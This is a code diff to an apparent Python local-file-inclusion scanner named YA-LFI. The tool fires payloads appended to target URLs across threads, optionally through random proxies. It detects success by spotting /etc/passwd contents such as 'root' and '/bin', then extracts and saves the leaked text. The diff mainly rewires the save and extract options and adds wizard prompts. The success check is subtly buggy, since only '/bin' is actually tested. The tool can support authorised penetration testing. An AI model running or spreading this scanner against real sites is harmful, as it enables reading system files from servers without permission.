@@ -64,7 +64,7 @@ def load_internal_payloads(payload_path):
 		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
 		quit()
 
-def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers):
+def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract):
 	global proxies_but_dict
 	global proxy_running
 	payloads = load_internal_payloads(payload_path)
@@ -78,11 +78,8 @@ def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,
 			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
 				p = p.strip()
 
-				if parse.proxy:
-					if proxy_running:
-						query = requests.get(target_url+p , headers=headers , proxies=random.choice(proxies_but_dict), cookies=cookies)
-					else:
-						query = requests.get(target_url+p , headers=headers, cookies=cookies)
+				if proxy_running:
+					query = requests.get(target_url+p , headers=headers , proxies=random.choice(proxies_but_dict), cookies=cookies)
 				else:
 					query = requests.get(target_url+p , headers=headers, cookies=cookies)
 
@@ -92,11 +89,10 @@ def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,
 				if "root" and "bash" and r"/bin" in query.text and query.status_code//100 == 2:
 					print("="*10)
 					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
-					if parse.extract:
+					if to_extract:
 						e = BeautifulSoup(query.text,'html5lib')
 						print(e.blockquote.text)
-					if parse.save_to_file:
-						save_file_path = parse.save_to_file
+					if save_file_path:
 						if os.path.isfile(save_file_path):
 							lock.acquire()
 							with open(save_file_path , "a") as save_file:
@@ -130,7 +126,7 @@ def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,
 			else:
 				time.sleep(3)
 
-def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers):
+def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers,save_file_path,to_extract):
 	if not target_url:
 		if os.path.isfile(url_list_path):
 			with open(url_list_path) as targets_file:
@@ -141,12 +137,12 @@ def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cooki
 							pass
 						else:
 							target = r"https://" + target
-						check_single_url_with_payload(x,payloads_per_thread,payload_path,target,cookies,headers)
+						check_single_url_with_payload(x,payloads_per_thread,payload_path,target,cookies,headers,save_file_path,to_extract)
 		else:
 			print("[X] NO TARGET URL SPECIFIED")
 			quit()
 	else:
-		check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers)
+		check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract)
 
 def count_payloads(payload_input):
 	match payload_input:
@@ -175,6 +171,7 @@ def count_payloads(payload_input):
 
 global proxies_but_dict
 global proxy_running
+proxy_running = False
 
 def load_proxies(proxy_path):
 	global proxies_but_dict
@@ -246,6 +243,17 @@ if not parse.wizard:
 	else:
 		print("[X] NO PAYLOAD FILE SPECIFIED")
 		quit()
+
+	if parse.extract:
+		to_extract = True
+	else:
+		to_extract = False
+
+	if parse.save_to_file:
+		save_file_path = parse.save_to_file
+	else:
+		save_file_path = False
+
 	if parse.url:
 		print(f"[*] RUNNING ON TARGET ---> {parse.url}")
 		if r"https://" in parse.url or r"http://" in parse.url:
@@ -254,9 +262,10 @@ if not parse.wizard:
 			current_target = r"https://" + parse.url
 
 		payloads_per_thread = payload_count//int(parse.threads)
+		
 
 		for x in range(int(parse.threads)):
-			threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers)).start()	
+			threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()	
 	else:
 		print(f"[*] RUNNING ON MULTIPLE TARGETS")
 		url_list_path = parse.url_list.lower()
@@ -265,7 +274,7 @@ if not parse.wizard:
 				payloads_per_thread = payload_count//int(parse.threads)
 
 				for x in range(int(parse.threads)):
-					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers)).start()	
+					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract)).start()	
 			else:
 				print("[X] GIVEN TARGET URL FILE NOT FOUND")	
 		else:
@@ -300,9 +309,20 @@ else:
 				if auth_file:
 					headers , cookies = load_authentication(auth_file , headers , cookies)
 
+				save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()
+
+				to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()
+
+				match to_extract:
+					case "1" | "y" | "yes" | "(y)es":
+						to_extract = True
+					case "2" | "n" | "no" | "(n)o":
+						to_extract = False
+					case _:
+						to_extract = False
 
 				for x in range(threads_count):
-					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers)).start()	
+					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract)).start()		
 			else:
 				print("[X] GIVEN TARGET URL FILE NOT FOUND")	
 
@@ -338,11 +358,23 @@ else:
 			if auth_file:
 				headers , cookies = load_authentication(auth_file , headers , cookies)
 
+			save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()
+
+			to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()
+			
+			match to_extract:
+				case "1" | "y" | "yes" | "(y)es":
+					to_extract = True
+				case "2" | "n" | "no" | "(n)o":
+					to_extract = False
+				case _:
+					to_extract = False
+
 
 			payloads_per_thread = payload_count//threads_count
 
 			for x in range(threads_count):
-				threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers)).start()
+				threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()	
 
 		case _:	
 			print("[X] NOT A VALID OPTION PLEASE RE LAUNCH THE PROGRAM AND SELECT AN AVAILABLE OPTION")
